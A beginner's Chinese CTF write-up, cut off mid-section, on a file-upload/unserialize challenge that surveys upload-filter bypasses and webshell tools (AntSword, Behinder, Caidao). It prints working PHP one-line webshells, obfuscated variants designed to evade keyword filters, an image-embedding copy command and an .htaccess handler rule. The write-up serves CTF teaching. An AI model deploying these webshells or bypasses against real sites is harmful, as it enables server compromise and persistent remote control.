> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yGeDJN0KsaHPWPhTWdQ1Kw)

****前文分享了 WHUCTF 部分题目，包括代码审计、文件包含、过滤绕过、SQL 注入。******这篇文章将讲解 Easy_unserialize 解题思路，详细分享文件上传漏洞、冰蝎蚁剑用法、反序列化 phar 等。虽然作者的解题思路错误，但也能看到我对文件上传的归纳总结，希望您喜欢。**

**第一次参加 CTF，还是能学到很多东西。下面分享两道我完成的 WEB 类型题目的解题过程，希望对您有所帮助。**非常有意思的文章，作为在线笔记，希望对入门的博友们有帮助！最后**感谢武汉大学，感谢这些大佬和师傅们（尤其出题和解题的老师们）~**

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPoNic86HMO8oqGojxXibEcfkictyAOn8jkLSDWRGL2JfvvVpLGKQmLxLWS9kLWlqxzQvzI5MXweSSkg/640?wx_fmt=png)这是 2019 年 9 月初入安全分享的文章，作为初学者，这些题目当时自己只能完成少部分，更多是学习别人的知识慢慢成长，未来希望自己能真正独立完成更多 CTF 夺旗题目。

> 从 2019 年 7 月开始，我来到了一个陌生的专业——网络空间安全。初入安全领域，是非常痛苦和难受的，要学的东西太多、涉及面太广，但好在自己通过分享 100 篇 “网络安全自学” 系列文章，艰难前行着。感恩这一年相识、相知、相趣的安全大佬和朋友们，如果写得不好或不足之处，还请大家海涵！  
> 接下来我将开启新的安全系列，叫 “系统安全”，也是免费的 100 篇文章，作者将更加深入的去研究恶意样本分析、逆向分析、内网渗透、网络攻防实战等，也将通过在线笔记和实践操作的形式分享与博友们学习，希望能与您一起进步，加油~
> 
> 推荐前文：网络安全自学篇系列 - 100 篇
> 
> https://blog.csdn.net/eastmount/category_9183790.html

文章目录：

*   **一. Easy_unserialize 题目描述**
    
*   **二. 作者解题思路及总结**
    
    1. 一句话和冰蝎蚁剑
    
    2. 图片一句话
    
    3. 过狗一句话绕过限制
    
    4.BurpSuite 文件上传漏洞的常用方法
    
*   **三. WP 解题思路**
    
*   **四. 总结**
    

作者的 github 资源：  

*   逆向分析：https://github.com/eastmountyxz/
    
    SystemSecurity-ReverseAnalysis
    
*   网络安全：https://github.com/eastmountyxz/
    
    NetworkSecuritySelf-study
    

> 声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。网站目前可以访问，后续应该会关闭，初学者可以试试，但切勿破坏。

一. Easy_unserialize 描述
======================

考点： 反序列化 + 文件上传

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcmLiaM5RaFdBvmBYfPCowicgQF6ffPukjroCrF9okJNy6VjbLL7swxibNg/640?wx_fmt=png)

主界面显示如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcZecDEVsHKt6MQicfU9MaQL2tiafVqcHmPdeXjoCickfOIt5lQo4ENg9Gw/640?wx_fmt=png)

其中，upload 上传文件, view 查看已上传的图片。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Cc3xrOrv4MM3dAMHGu7aSTlaSnCEjiaQtGk25KppNH1Uyrz8ibMzwcdNPA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcwFGvgbNpwY7E6xPGf42jSPPFSoWcnkdx39Xgu47kA67UdwSzDf4klg/640?wx_fmt=png)

上传文件代码如下：

```
<form action="upload.php" method="post" accept-charset="utf-8" enctype="multipart/form-data">    <label ></form>
```

二. 作者解题思路及总结
============

这道题目有点遗憾没有完成，题目虽然叫 “Easy_unserialize”，但我的第一想法是文件上传漏洞，也尝试了很多方法都未成功。下面我将分别从我的解题思路和 WP 思路进行讲解，希望对您有所帮助~

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcqNwghwgbwZ8LdSwLQ6lhAhfAH85kHiakBbb4Bw9Hj1S1WW4NmACLfxA/640?wx_fmt=png)

1. 一句话和冰蝎蚁剑
-----------

(1) “一句话木马” 服务端  
服务端一句话是指本地存储的脚本木马文件，是我们要用来将恶意代码上传到服务器网站中执行权限。该语句触发后，接收入侵者通过客户端提交的数据，执行并完成相应的操作。PHP 常用一句话木马的代码如下：

```
//http://localhost/easy_unserialize/ma01.php<?php eval($_POST[whuctf]); ?>//http://localhost/easy_unserialize/ma02.php<?php assert($_POST[whuctf]); ?>
```

(2) 中国蚁剑反弹 shell  
通过中国蚁剑连接 “ma01.php” 文件，其代码为一句话木马“<?php eval($_POST[whuctf]); ?>”；然后再蚁剑空白处右键“添加”，设置 URL 地址及连接密码“whuctf”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CclaYcDnCT0GcBcCyIhSasEcmEJmMDQPGFugW2D3EmpZh4SsRCOcefFw/640?wx_fmt=png)

连接成功后成功获取目标网站的服务器文件目录，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Ccq9EDMmGY7ZZIAgUDS9XIzyqs8ZjQVziabeUbEnDbaL0icbAt3l74TfIw/640?wx_fmt=png)

(3) 冰蝎反弹 shell  
冰蝎作为新款的 webshell 连接工具，使用效果非常好。其基本使用方法如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcntIa6iaibCQ5qVJ0icfTHb9LBCRaYF2QAUFqKoa30E0wu5jOfzzGHDWjQ/640?wx_fmt=png)

连接 URL 和密码并反弹 shell。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcQyrGaVujRXlKycP2jTkckcsuqic50eT4VDbxdV51nlGbGqy7AzDKOrQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CceDEXiaGNyOz4coRMpYTwakDGs9NDiadFkVRfIXtUVTxb9NWptng3XDUA/640?wx_fmt=png)

下载地址：

*   https://github.com/rebeyond/Behinder
    

2. 图片一句话
--------

(1) 题目分析  
由于该题只能上传图片文件，我们想到的是图片一句话木马。针对该网站，如果我们直接上传 “ma01.php” 文件它会提示 “You can’t upload this kind of file!” 错误，这是因为它指定了图片文件格式。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcRsaJXMuDQJkGAgRYg0oYefG8MAYHZAEX1ceyC9X0k9iau0VYJDUSZEA/640?wx_fmt=png)

而当我们上传图片 “mm.jpg” 时，它就能成功上传，并且查看图片如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcFkot5SuwI9A8z7GYOs21yKz76SAhnWsOTSksyQia2EoN0SxD2B2mhzg/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcKV8ician10n9zoqNPuKnCktxKBxJicMn1YlMWDPQfFY2HpwZLOowFqoSg/640?wx_fmt=png)

(2) 网站内容检查  
内容检查是网站安全的重要手段之一。假设我们将包含一句话木马的 “fox.php” 修改为 “1.jpg” 并上传，有的网址会提示上传错误，因为 JPG 格式不能执行 PHP 文件脚本的。

```
<?php eval($_POST[fox]); ?>
```

如下图所示，它会判断图片的文件头，包括 gif、png、jpg 等格式。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcepwsVXpTiaTeOlq57ef5KibicwNbexP1AickiadCOd44YWB5Qz6ulTAvCJg/640?wx_fmt=png)

文件头是用来判断数据格式的，这里尝试修改文件头进行上传，以 gif 文件为例，添加文件头 “GIF89a” 后即可上传成功。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcKibLapyFkiaib9WLHWqpCKyt8CV0RMImHDMOh6xPQ4ibeibQfdqnypb9RmA/640?wx_fmt=png)

同样可以尝试 BurpSuite 抓包修改文件后缀. php 进行上传，后面会详细讲解。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcUq0RVzSZsEnMrpWwwGH9m39wpYFFl75TvzKteq1zHhzvtdt7qPl5SQ/640?wx_fmt=png)

(3) 暂定解题思路  
由于该题有检测文件的 content-type，我们可以准备一张很小的图片，比如画图中新建一个像素的 jpg，然后往里面添加 shell 到图片尾部。同时，该题仅检测文件头，而没检测图片是否能正常使用，所以图片几十个字节也够用。

接下来还需要让网站按 PHP 后缀来解析，这又涉及到解析漏洞。比如 IIS 的服务器会把诸如 1.asp;1.jpg 以 asp 来解析，虽然后缀本质是 jpg；旧版的 Apache 可以上传 1.php.xxx 文件，只要 xxx 对容器来说不是动态脚本不能解析，它就会往左边逐个解析，直到遇到 php 就解析了；还有旧版的 Ngnix 可以上传 shell.jpg，然后访问 shell.jpg/1.php 或者 shell.jpg%00.php 都可以用 php 来解析 jpg 文件。这些都是需要用到网站容器、系统、环境的缺陷或者漏洞。

(4) 图片一句话木马制作  
某些网站上传文件时，会检查你上传文件的头目录，如果你的一句话木马是放在 PHP 文件中，它很容易被识别出来。这个时候图片一句话木马的作用就体现出来了。在 CMD 中直接运行，如下图所示，它是在 mm.jpg 图片中插入 mm01.php 中的一句话木马 “<?php eval($_POST[whuctf]); ?>” ，并存储为 mm-ma01.jpg 图片，其中 b 表示二进制，a 表示 ascii 编码。

```
copy mm.jpg/b+ma01.php/a mm-ma01.jpg
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcKugFzXgZvBiant0gxCte4jyTQQ8IicGMBUXQlhqSUOX7XCRxicQp3hg6Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcAkq5BDHIiaFr8y5Wf1DhfXDuicwo4ib3tFiaicG0yhHdA7AUkWfABxYsAyQ/640?wx_fmt=png)

用 Notepad++ 打开 “mm-ma01.jpg” 可以看到，里面包含了一句话木马，并且不影响我们的图片质量。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcQutLibVq5o85WtBlhDAPGehLIhN4YSIicQtafJfZe3W7EibhMGibfWP6qg/640?wx_fmt=png)

此时我们上传包含一句话木马的 “mm-ma01.jpg” 文件，但提示错误：You could not upload this image because of some dangerous code in your file!，这是因为它检查了 “eval” 关键词。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Ccpem4pibuStmiawj8gIibkvrYn8aa7iaTmjD0ZgAyUxBmDwiaHp2XDleGTjA/640?wx_fmt=png)

3. 过狗一句话绕过限制
------------

上面说明对某些关键字有限制，我们需要对一句话木马进行绕过处理，下面我总结了常见的一些方法：

```
//通过变量赋值<?php $a='b'; $$a='assert'; $b($_POST[shell]); ?><?php $a = "eval"; $a(@$_POST['shell']); ?>//通过str_replace函数替换<?php $a=str_replace("Waldo", "", "eWaldoval"); $a(@$_POST['shell']); ?>//通过base64_decode函数编码<?php $a=base64_decode("ZXZhbA=="); $a($_POST['shell']);?>//通过字符串拼接<?php $a="e"."v"; $b="a"."l"; $c=$a.$b; $c($_POST['shell']); ?>//利用parse_str函数<?php $str="a=eval"; parse_str($str); $a($_POST['shell']); ?>//使用脚本<script language="PHP"> @eval($_POST['shell']); </script>//创建shell.php文件<?php fputs(fopen('shell.php','w'),'<?php assert($_POST[whuctf]);?>'); ?>//使用一句话木马时可以在函数前加”@”符 让php语句不显示错误信息从而增加隐蔽性
```

下面是我进一步制作的图片一句话木马。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcoicsPDibo0O30VeSe3RCibfHhpNkiaY6WKgFicspmu6nGvzEgicYld45HXCA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Ccqk9icxpzv07hZAT6RxWtmic4ggTPKqtg9fZicwybuYmdkTS5oBNCX1dpA/640?wx_fmt=png)

遗憾的是，虽然图片都能成功上传，但中国蚁剑和冰蝎都无法连接成功。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Ccy8icTAKpOGByyWG6ExadgTIvQLOntC25zZX0TAcO63PxFmjcIibicOljA/640?wx_fmt=png)

同时，发现只要增加文件头如 “GIF89a”，就能够绕过该网站上传图片的限制。

```
GIF89a<?php assert($_POST[whuctf]); ?>
```

如果是本地上传 “gif-ma01.php” 文件，就能够成功反弹 shell，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Ccfmqb3DKY70AwQE4ibQqn8Wq0WCEJv8icFKcAT5drWaJmhvmFRk4tSorA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcP4gzyjM73FmWIM0uSLB8UghSquIy1m5iafIcYb40deNSy2AR1ro9cYA/640?wx_fmt=png)

但该网站会提示 “You can’t upload this kind of file!”，因为它对上传的后缀名有校验（从而拦截 gif-ma01.php），而如果修改后缀为 “gif-ma01.gif”，则能够成功上传。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Cc0SmLicWTNNWnEKQR6nsOZVb1esjialfSozGajfUrHjFAOk8ib727nkgnw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Ccu2xHxBKhtWCAIdEGInYrpdPsc1hGRLUv7lib5JlxcX6LczfsdqlfiavQ/640?wx_fmt=png)

查看该 gif 图片显示如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Cc6O4FhrXUq8qqe2QHkXK64lp65QPD3u7a8fr1SQKlc3Rx1flnULQyng/640?wx_fmt=png)

但是中国蚁剑、冰蝎等仍然无法连接，接着怎么办呢？

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Cc75qTHfTcvR2u6c6ZxC3bsFibgvgZfvlrC3pxsZclhia38sEf1GpyEicpw/640?wx_fmt=png)

分析原因:  
这是因为部分网站是有文件格式解析的，即网站会判断上传的脚本是否可以被执行，某些文件格式是无法被解析的，即上传的 jpg\gif 格式文件无法被 php 格式解析。这也是为什么有的图片一句话木马不能访问，其实和网站环境相关，也涉及到解析漏洞，需要让所上传的文件按 php 格式解析才能运行。

4.BurpSuite 文件上传漏洞的常用方法
-----------------------

接下来作者想通过 BurpSuite 拦截上传的文件，对其格式进行修改，看看能否上传并按照期待的 php 文件格式解析。下面详细介绍文件上传漏洞的各种方法，希望能帮助到您。

方法 1：JS 绕过文件上传  
有的网站会通过客户端 JS 验证本地上传文件，所以如果你上传一个不正确的文件格式，它的判断会很快显示出来你上传的文件类型不正确。我们可以删除文件上传校验函数，如代码 onsubmit="return checkFile()" 中的 checkFile()。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcbaLebBtd42icUTYFy2K8RY6icvXhNmGqTPQ8WNom5Jr2ICzWhF3ic6ZGA/640?wx_fmt=png)

比如，上传其他文件会有相关的错误提示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcoibleKaMw0ME0EQ2PXqp8t9wtSWBHI9dD9coZibjqTbyRahEYoNo5fiaQ/640?wx_fmt=png)

或者尝试在允许上传格式的文件里添加. php 格式。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcUNl3cQjibd1ZhgVkltmTblHeG00wgUJW7qxWz3rAZDyY5qlmibibjRiaJA/640?wx_fmt=png)

失败： 因为该题没有本地校验，并且当前无法看到上传校验的代码。

方法 2：上传允许上传的文件，再用 BurpSuite 进行抓包改包  
比如，首先上传一个规则的文件 “gif-ma01.gif”，再用 BurpSuite 抓包修改为 “gif-ma01.php”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcibUZLeMYYwyKBibQXib9FgNy5oJicm8ahjaIuOH86xzKy2uBqBR9dsdBoA/640?wx_fmt=png)

失败： 提示必须要上传图片格式 “You can’t upload this kind of file!”。

方法 3：MIME 绕过文件上传  
MIME（Multipurpose Internet Mail Extensions）多用于互联网邮件扩展类型，是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。

核心作用：服务器判断你上传的是什么文件。其基本类型比如：

*   {".3gp", “video/3gpp” }
    
*   {".asp", “application/x-asap” }
    
*   {".avi", “video/x-msvideo” }
    
*   {".bmp", “image/bmp” }
    
*   {".cpp", “text/plain” }
    
*   {".jpe", “image/jpeg” }
    
*   {".mp4", “video/mp4” }
    
*   …
    

本题显示的是图片格式，下面是使用 BurpSuite 抓取所上传的 JPG 文件和 PHP 文件的类型对比。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcaR7Kuq0jyiahKDK20rPMuby8uaicfwu6gr7f0THWweSfpk1AjibFAretg/640?wx_fmt=png)

某些情况会限制上传文件的类型，此时也需要修改 “Content-Type” 类型。比如将上传的 PHP 文件 Content-Type 修改为“image/gif”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcHFBia7nJqkxMZDiazzLmONJXjWX15icWcY78WogYDxvRxG1N8ia7o7EPMw/640?wx_fmt=png)

失败： 简单修改后缀名或 content-type 均无法实现，提示必须要上传图片格式 “You can’t upload this kind of file!”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Cc35eWS3wXEMrEO8tlp5paMTYHhbu4NY4npFwHJ4iaxXon9xIEyvCS1tA/640?wx_fmt=png)

方法 4：扩展名限制绕过

① 大小写、双写绕过文件上传  
大小写是把文件扩展名进行 php 测试绕过。如 “1.php” 文件上传会被拦截，而修改成 “1.phP” 后成功上传。双写则为 “phphpp” 等格式。

② 点、空格绕过文件上传  
在文件后缀上添加空格重新命名，会自动删除所谓的空格，点同理会自动删除的，因为可能尝试欺骗服务器验证。系统默认是不支持加空格、加点的，比如 “.php 空格” 会自动解析为 “.php”，“.php.” 会自动解析为 “.php”。比如使用 BurpSuite 抓包进行操作，如下图所示，将上传的“.php” 文件后增加一个空格，再点击 Forward 进行上传。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Ccmoqiasjd2QOktAVicxT5wfnaSY7pVF7vLoHP3fqdcnE3IrXDIyVcLavw/640?wx_fmt=png)

③ htaccess 文件绕过上传  
.htaccess 文件或者 “分布式配置文件” 提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。简单来说，htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。它的功能有：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许 / 阻止特定的用户或目录的访问、禁止目录列表、配置默认文档等。这里我们需要用到的是改变文件扩展名，代码如下：

```
<FilesMatch "eastmount">SetHandler application/x-httpd-php</FilesMatch>
```

接着它会把 fox 名字的文件全都以 php 来运行，需要特殊文件进行创建，如 Notepad++。首先上传一个 “.htaccess” 文件，再上传一个 “fox.jpg” 文件，它会将这张图片以 php 来解析。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Cc5x9Hp8LMXhBZicclHHOUN3uosicSgdAaUiathGWsj7z0WKjIS7HwLscZg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcEjichOIPCrovMVlCID4S0Ua1KX6M1HA1xOnc49x7ofukdF4IgwrubAQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Cctqrj6ksKkPduibAGPsG20Dich3b5mibyWMoibTV1fML1sEBEesHLOmtlgQ/640?wx_fmt=png)

显示如下图所示，因为是以 php 格式解析的，而不显示成一张 jpg 图片。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcoYpDWf1HhYWxI0NW9ym8K1PZsTiaPEOWuUOicm10BsnzBibWdRPLcWyRQ/640?wx_fmt=png)

接着打开中国菜刀，获取了该服务器的目录。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcqxfnNp3Y3xOoxibTqtNBcyKk8ibZTaaNic0FqoHr3mG9dHFeAWNwoTmmw/640?wx_fmt=png)

显示的两个文件如下图所示：包括 “fox.jpg” 和 “.htaccess”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcOqrjEYuBm8uTRjJOwJYicGzQ473az1AOrcAwt8Y9oIY1UpYLDXqQjtA/640?wx_fmt=png)

④ PHP345 文件绕过上传  
PHP3 代表 PHP 版本 3，这里用于文件绕过检测。一般的软件都是向下兼容，PHP3 代码，PHP5 同样兼容能够执行。如下图所示，fox.php5 文件同样能够正常上传。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcYeAwM8KDpA0BUOiaTqaNZwkgdI7j8Fpmxdv3CyBCZiabe9vh2s7kFhow/640?wx_fmt=png)

⑤ Windows ::$DATA 绕过  
Windows ::$DATA 绕过只能用于 Windows，Windows 下 NTFS 文件系统有一个特性，即 NTFS 文件系统在存储数据流的一个属性 DATA 时，是请求 a.php 本身的数据。如果 a.php 还包含了其他的数据流，比如 a.php:lake2.php，请求 a.php:lake2.php::$DATA，则是请求 a.php 中的流数据 lake2.php 的流数据内容。简单来说，就是在数据后面加上::$DATA 实现绕过，fox.php::$DATA 返回 fox.php 数据。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcYJ9NTXT1IuGbfNx2qIMrbAGosEX38dk0Ywjg1LJNLmaD7cyDNCia9Kw/640?wx_fmt=png)

⑥ Apache 解析漏洞上传  
Apache 是从右到左判断解析，如果为不可识别解析，就再往左判断。比如 1.php.xxx 对 Apache 来说 xxx 是不可解析的，所以就会解析成 1.php，这就是该漏洞的实现原理。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcwwS4V97GiaWXiaZrgK5zh5ofOPNVjZlyiclRbkZZroBk57L8iauLBcBRpA/640?wx_fmt=png)

如上图所示，将本地 “fox.php” 修改为“fox.php.xxx”，然后点击上传。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcVAaytX3iaTcn5f3sJrLNIyIu8giagr1DgdR9GicP4HB78pWgR55R4miaNg/640?wx_fmt=png)

接着尝试用菜刀去连接。URL 为靶场的网址，密码为 PHP 一句话木马中的 “fox”，代码如下：

```
<?php eval($_POST[fox]); ?>
```

下图是 Caidao 连接的示意图。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcWG92nO54vBTXWPv3KXccK2Qv8vdAHtiat309k7XUmR9lMd0QC3cCgWA/640?wx_fmt=png)

连接之后，成功获取文件目录，可以看到 “fox.php.xxx” 被成功上传。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcSY0qiaZfewD7HFcCQ8gF1TibkMFpBj2GZzIatmNEsM3VNyYO3f8RCaAQ/640?wx_fmt=png)

本题能够成功上传 “gif-ma01.php.xxxgif” 文件，如下图所示，难道成功了吗？

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CciczicV4ICwfRic2R4w4cibVMBYdXgxpgl3zRY1iczZgbkPHGAyYPJojzSEA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcjOy5Uxqp4DIY3NNTCUUHuVoMQ0CbWRj3jXyMiafiaSjm9zBhicn8MhQLQ/640?wx_fmt=png)

然而当使用中国蚁剑和冰蝎去连接时仍然失败，说明该网站不存在 Apache 解析漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcXWTx1DFB4RLZ5ngJyUyxYdgzciaKnC3oJ7ZdDCBBY7KzwO8wYrlgsYw/640?wx_fmt=png)

失败： 这道题目不会让你上传 “.htaccess” 文件，同时也不会让你简单绕过上传，不存在 Apache 等漏洞。

方法 5：%00 截断上传  
0x00 是十六进制表示方法，是 ASCII 码为 0 的字符，在有些函数处理时，会把这个字符当做结束符。这个可以用在对文件类型名的绕过上。需要注意，00 截断 get 是可以自动转换的，post 需要特殊转换，下面举一个例子。

首先，选择上传一张包含一句话木马的 “php.jpg” 图片。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcWbUCIvn8YQwhRH1BGvn3YicstBz0EInPT3kgxhz3noUBXwMb3jNGlXA/640?wx_fmt=png)

然后，利用 BurpSuite 抓包并修改后缀名为 “php.php%001.jpg”。如果直接修改为“php.php” 可能会被过滤。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Cco1STDWbnMpOM0HFXl9yW1Q74NnCjZNzSaPjj0XycOgelZzqbeKMDPA/640?wx_fmt=png)

这种方法仍然不可行，因为它采用 post 提交数据，需要特殊转换。这里选中 “%00” 右键转换为 URL 格式，如下图所示，然后再点击 “Forward” 提交数据即可。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcA5qbfKztvD17FJVteSeTFDdhQ2O5ia4cpkaPyzaiaWqGjNqq8z3gNN5g/640?wx_fmt=png)

文件成功上传，%00 自动截断后面的内容。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcvLiatOVrDPadQDnvXIqkzefDBW0h5CYxjBfLrHsO0eWSmiaM6Td0ibWDw/640?wx_fmt=png)

本题我也进行了尝试，上传包含一句话木马的图片文件 “gif-ma02.gif”，然后利用 BurpSuite 抓包并修改后缀名为 “gif-ma02.php%001.gif”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcIlyhZxQTOm3vEMfaicP5zQScVhBrzY4Vg8K3h9NYFqLgsQlQyUJmFmQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcX4THqmrvJFyuxxsTRmc56pfsCEp9G9OokGOXR8dHdu5d7HFGYM5pLw/640?wx_fmt=png)

失败： 非常遗憾，系统识别出来，并且扔给我一个 “Hacker!”，真让人哭笑不得，还是太菜。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9Cc2c4UurcjXGgVth18VDft8apia0xMjpZSiaBeclpwZ1IGI4f3RHvm9lmg/640?wx_fmt=png)

方法 6：特色版本漏洞

① IIS6.0 解析漏洞

*   目录解析  
    以 “*.asp” 命名的文件夹里的文件都将会被当成 ASP 文件执行，比如“1.asp/1.jpg”，这里 1.jpg 会被当做 asp 文件执行。
    
*   文件解析  
    “*.asp;.jpg”像这种畸形文件名在 “;” 后面的直接被忽略，也就是说当成 “*.asp”文件执行。比如 “1.asp;1.jpg” 命名的文件，同样是以 asp 脚本进行执行。
    

利用 IIS6.0 解析漏洞，我们可以在网站下建立名字为 “*.asp” 、“*.asa” 的文件夹，其目录内的任何扩展名的文件都被 IIS 当作 asp 文件来解析。例如创建目录 “vidun.asp”，则“/vidun.asp/1.jpg” 将被当作 asp 文件来执行。如下图所示，尝试在左边 “upfile/” 文件路径名后面增加文件名称“1.asp;”，然后点击请求发送。右边会显示文件成功上传，其路径详见图中。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CcSwUYVOpQxUwMge2Cd6a1Puib3m2s7vSicrIkLXx7wicUwcWzsAvibAExVw/640?wx_fmt=png)

上传之后的文件可以成功访问，如下图所示，然后 Caidao 连接即可。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROswl3EEylYs1kPj1ZJR9CciawRaSzqibD7dKDUiaqBDbPUyicMYkEbkAzsstkgdyIxTEiaEpP4r7RwGAQ/640?wx_fmt=png)

② 编辑器漏洞  
编辑器属于第三方软件，它的作用是方便网站管理员上传或编辑网站上的内容，类似我们电脑上的 Word 文档。常用编辑器包括 FCKeditor、EWEbeditor、CKFinder、UEDITOR 等。

FCKeditor 编辑器漏洞利用  
